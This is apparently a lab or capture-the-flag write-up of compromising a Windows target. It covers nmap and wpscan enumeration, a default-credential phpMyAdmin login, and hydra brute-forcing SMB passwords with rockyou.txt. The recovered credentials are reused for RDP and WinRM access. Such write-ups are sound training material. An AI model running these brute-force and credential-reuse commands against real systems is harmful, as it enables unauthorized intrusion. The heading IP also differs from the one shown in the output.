## IP: `192.168.1.50`

I've added the IP of target to `/etc/hosts` 

![[Pasted image 20250908152655.png]]


```bash
──(rootkali)-[~]
└─# ping -c 3 target1.local
PING target1.local (192.168.100.50) 56(84) bytes of data.
64 bytes from target1.local (192.168.100.50): icmp_seq=1 ttl=128 time=2.32 ms
64 bytes from target1.local (192.168.100.50): icmp_seq=2 ttl=128 time=1.11 ms
64 bytes from target1.local (192.168.100.50): icmp_seq=3 ttl=128 time=1.23 ms

--- target1.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.105/1.551/2.324/0.548 ms

```

Target is **up** and it's a Windows Machine.

## NMAP Service Detection

```bash
nmap -sV -p- -T4 target1.local -oG Target_1/nmap-service-detection-full-port.txt                                                                                                     1 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-08 15:31 IST
Nmap scan report for target1.local (192.168.100.50)
Host is up (0.0010s latency).                                                                                                                                                                
Not shown: 65521 closed tcp ports (reset)                                                                                                                                                    
PORT      STATE SERVICE            VERSION                                                                                                                                                   
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)                                                                                                                  
135/tcp   open  msrpc              Microsoft Windows RPC                                                                                                                                     
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn                                                                                                                             
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds                                                                                                      
3307/tcp  open  opsession-prxy?                                                                                                                                                              
3389/tcp  open  ssl/ms-wbt-server?                                                                                                                                                           
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                   
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                   
49152/tcp open  msrpc              Microsoft Windows RPC                                                                                                                                     
49153/tcp open  msrpc              Microsoft Windows RPC                                                                                                                                     
49154/tcp open  msrpc              Microsoft Windows RPC                                                                                                                                     
49155/tcp open  msrpc              Microsoft Windows RPC                                                                                                                                     
49160/tcp open  msrpc              Microsoft Windows RPC                                                                                                                                     
49174/tcp open  msrpc              Microsoft Windows RPC                                                                                                                                     
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                 
SF-Port3307-TCP:V=7.92%I=7%D=9/8%Time=68BEA997%P=x86_64-pc-linux-gnu%r(NUL                                                                                                                   
SF:L,6B,"g\0\0\x01\xffj\x04Host\x20'ip-192-168-100-5\.ap-south-1\.compute\
SF:.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server");
MAC Address: 02:27:BE:F6:E1:21 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.97 seconds

```

## Port 80: Wampserver
![[Pasted image 20250908153410.png]]

Some interesting Things.

![[Pasted image 20250908153656.png]]

## Wordpress Site

- Running wpscan doesn't give anything interesting.
```bash
root@kali:~# wpscan --url http://wordpress.local
_______________________________________________________________                                                                                                             
         __          _______   _____                                                                                                                                        
         \ \        / /  __ \ / ____|                                                                                                                                       
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                      
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                                                       
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                      
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                      
                                                                                                                                                                            
         WordPress Security Scanner by the WPScan Team                                                                                                                      
                         Version 3.8.18                                                                                                                                     
       Sponsored by Automattic - https://automattic.com/                                                                                                                    
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                      
_______________________________________________________________                                                                                                             
                                                                                                                                                                            
[i] It seems like you have not updated the database for some time.                                                                                                          
[?] Do you want to update now? [Y]es [N]o, default: [N]                                                                                                                     
[+] URL: http://wordpress.local/ [192.168.100.50]                                                                                                                           
[+] Started: Mon Sep  8 15:43:30 2025                                                                                                                                       

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.51 (Win64) PHP/7.4.26
 |  - X-Powered-By: PHP/7.4.26
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordpress.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordpress.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://wordpress.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordpress.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9.3 identified (Latest, released on 2022-04-05).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://wordpress.local/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.9.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://wordpress.local/, Match: 'WordPress 5.9.3'

[+] WordPress theme in use: spintech
 | Location: http://wordpress.local/wp-content/themes/spintech/
 | Latest Version: 1.0.33 (up to date)
 | Last Updated: 2022-03-28T00:00:00.000Z
 | Readme: http://wordpress.local/wp-content/themes/spintech/readme.txt
 | Style URL: http://wordpress.local/wp-content/themes/spintech/style.css?ver=5.9.3
 | Style Name: Spintech
 | Style URI: https://burgerthemes.com/spintech-free/
 | Description: Spintech WordPress theme is specially designed for an IT & Software Company. Theme is perfectly for ...
 | Author: burgersoftware
 | Author URI: https://burgerthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.33 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.local/wp-content/themes/spintech/style.css?ver=5.9.3, Match: 'Version: 1.0.33'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] burger-companion
 | Location: http://wordpress.local/wp-content/plugins/burger-companion/
 | Last Updated: 2022-04-20T13:51:00.000Z
 | [!] The version is out of date, the latest version is 4.9
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.8 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://wordpress.local/wp-content/plugins/burger-companion/readme.txt

[+] wp-responsive-thumbnail-slider
 | Location: http://wordpress.local/wp-content/plugins/wp-responsive-thumbnail-slider/
 | Last Updated: 2022-02-11T03:10:00.000Z
 | [!] The version is out of date, the latest version is 1.1.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://wordpress.local/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://wordpress.local/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=============================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Sep  8 15:43:37 2025
[+] Requests Done: 175
[+] Cached Requests: 5
[+] Data Sent: 44.797 KB
[+] Data Received: 202.391 KB
[+] Memory used: 236.234 MB
[+] Elapsed time: 00:00:07

```

- `/wp-content/uploads/` doesn't have anything.

![[Pasted image 20250908154706.png]]

- `/wp-content/plugins/burger-companion` 
![[Pasted image 20250908154842.png]]


## wp-admin

![[Pasted image 20250909042406.png]]


## phpmyadmin

![[Pasted image 20250909041415.png]]

Default creds login
## Port 445 (SMB)

```bash
┌──(rootkali)-[~]
└─# hydra -l admin -P rockyou.txt 192.168.100.50 smb -t 10 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 15:50:25
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.168.100.50:445/
[445][smb] host: 192.168.100.50   login: admin   password: superman
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 15:50:28

```

- Found Creds: Username: `admin` & Password: `superman`

```bash
root@kali:~# hydra -l mike -P rockyou.txt target1.local smb -t 10
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 16:09:57
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://target1.local:445/
[445][smb] host: target1.local   login: mike   password: diamond
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 16:10:01

```

- Found Creds: Username: `mike` & Password: `diamond`


## Port 3389 (RDP)

Let's try the smb creds for rdp login.

![[Pasted image 20250908155857.png]]

BOOM ! We are in

## Admin Flag

![[Pasted image 20250908161609.png]]


## Port 5985 (WinRM)

```bash
┌──(rootkali)-[~/Target_3]
└─# crackmapexec winrm 192.168.100.50 -u admin -p superman                                          
WINRM       192.168.100.50  5985   NONE             [*] None (name:192.168.100.50) (domain:None)
WINRM       192.168.100.50  5985   NONE             [*] http://192.168.100.50:5985/wsman
WINRM       192.168.100.50  5985   NONE             [+] None\admin:superman (Pwn3d!)

```

